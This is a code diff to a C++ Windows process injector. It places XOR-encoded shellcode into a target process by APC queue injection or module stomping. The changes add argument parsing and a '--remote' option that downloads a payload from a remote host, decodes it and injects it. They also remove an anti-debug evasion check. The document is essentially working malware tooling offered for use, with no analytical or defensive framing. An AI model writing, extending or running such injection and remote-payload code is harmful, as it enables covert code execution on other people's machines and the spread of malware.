@@ -99,6 +99,7 @@ void moduleStomping(int pid) {
     HMODULE remoteModule = NULL;
 
     hProcess = mainInjector.process(process_id);
+	std::cout << "Handle for pid " << pid << ": " << hProcess << "\n";
     rBuffer = mainInjector.vAlloc(hProcess, NULL, sizeof(moduleToInject));
     //rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
     mainInjector.wrMem(hProcess, rBuffer, (LPVOID)moduleToInject, sizeof(moduleToInject));
@@ -155,44 +156,120 @@ void moduleStomping(int pid) {
     
 
 }
+
+void printHelp(const char* programName) {
+    std::cout <<
+        "Usage:\n"
+        << programName << " --pid <pid> --method <apc|stomp> [options]\n\n"
+        "Options:\n"
+        "  --pid <int>            Target process id\n"
+        "  --method <string>      apc | stomp\n"
+        "  --key <hex>            XOR key (default 0x67)\n"
+        "  --remote <url>         Remote host (https://site.com)\n"
+        "  --file <path>          Remote file (/payload.bin)\n"
+        "  --help                 Show this help\n";
+}
+
+struct Options {
+    int pid = 0;
+    std::string method;
+    bool useRemote = false;
+
+    std::wstring url;
+    std::wstring file;
+
+    unsigned char key = 0x67;
+};
+Options parseArgs(int argc, char* argv[]) {
+    Options opt;
+
+    for (int i = 1; i < argc; i++) {
+        std::string arg = argv[i];
+
+        if (arg == "--help") {
+            printHelp(argv[0]);
+            exit(0);
+        }
+
+        else if (arg == "--pid" && i + 1 < argc) {
+            opt.pid = std::stoi(argv[++i]);
+        }
+
+        else if (arg == "--method" && i + 1 < argc) {
+            opt.method = argv[++i];
+        }
+
+        else if (arg == "--key" && i + 1 < argc) {
+            opt.key = static_cast<unsigned char>(std::stoi(argv[++i], nullptr, 0));
+        }
+
+        else if (arg == "--remote" && i + 1 < argc) {
+            opt.useRemote = true;
+            std::string tmp = argv[++i];
+            opt.url = std::wstring(tmp.begin(), tmp.end());
+        }
+
+        else if (arg == "--file" && i + 1 < argc) {
+            std::string tmp = argv[++i];
+            opt.file = std::wstring(tmp.begin(), tmp.end());
+        }
+    }
+
+    return opt;
+}
+
+
 int main(int argc, char* argv[]) {
 
-    if (antiDebug.checkDebug() != 0) {
-        std::cout << "I am doign nothing malicious man !!" << "\n";
-        return 0;
-    }
-
-
-
-
-    if (argc < 2) {
-        std::cout << "Enter an pid and a module name (etheir stomp or apc)" << std::endl;
-        return EXIT_FAILURE;
-    }
-    if (argc < 3) {
-        std::cout << "Enter a module name (etheir stomp or apc)" << std::endl;
-        return EXIT_FAILURE;
-    }
-    process_id = atoi(argv[1]);
-
-    unsigned char shellcode_key = 0x67;
-
-
-    helperHandler.xor_shellcode(shellcode, shellcode_len, shellcode_key);
-
-    if(strcmp(argv[2], "apc") == 0) {
-        apcQueueInjection(process_id);
-    }
-	else if(strcmp(argv[2], "stomp") == 0)
-    {
-        moduleStomping(process_id);
     
-    }
-    else {
-		std::cout << "Invalid method specified. Use 'apc' or 'stomp'." << std::endl;
-		return EXIT_FAILURE;
+
+    Options opt = parseArgs(argc, argv);
+
+    if (opt.pid == 0 || opt.method.empty()) {
+        printHelp(argv[0]);
+        return 1;
     }
 
+    if (opt.method != "apc" && opt.method != "stomp") {
+        std::cout << "Invalid method\n";
+        return 1;
+    }
+
+    std::vector<unsigned char> shellcode_vector;
+
+    if (opt.useRemote) {
+        if (opt.url.empty() || opt.file.empty()) {
+            std::cout << "Missing remote url/file\n";
+            return 1;
+        }
+
+        shellcode_vector = helperHandler.fetchRemoteShellcodeAndDecode(
+            opt.url,
+            opt.file,
+            opt.key
+        );
+    }
+    if(!shellcode_vector.empty()) {
+        
+        helperHandler.xor_shellcode(shellcode_vector.data(), shellcode_vector.size(), opt.key);
+	}
+    else {
+        unsigned char shellcode_key = 0x67;
+
+
+        helperHandler.xor_shellcode(shellcode, shellcode_len, shellcode_key);
+    }
+	std::cout << "pid: " << opt.pid << "\n";
+    
+
+    
+
+    if (opt.method == "apc") {
+        apcQueueInjection(opt.pid);
+    }
+    else if (opt.method == "stomp") {
+        moduleStomping(opt.pid);
+    }
 
     return 0;
 }
